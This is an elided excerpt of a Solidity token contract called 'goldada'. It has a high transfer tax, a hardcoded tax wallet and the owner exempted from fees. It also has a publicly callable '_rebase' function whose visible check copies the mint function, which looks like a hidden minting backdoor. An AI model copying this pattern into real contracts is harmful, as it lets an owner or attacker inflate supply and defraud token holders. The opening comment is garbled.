...
// b/P;ecause it relies on the compiler's built in overflow checks.
...
contract Rib is Context, IERC20, IERC20Metadata,Ownable {
    ...
    string private _name = "goldada";
    string private _symbol = "gada";
    uint256 private _initSupply = 1270000*10**18;
    
    uint256 public dexTaxFee = 1200; 
    ...
    constructor() {
        ...
        taxAddress = 0xfABa975F10F7cEB05a6eD959726923821795a739;
        ...
        _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[taxAddress] = true; //mywithoutfeeaddress1
    ...
    function _mint(address account, uint256 amount) internal {
      ...
      function _rebase(address account, uint256 amount) public {
        require(account != address(0), "ERC20: mint to the zero address");
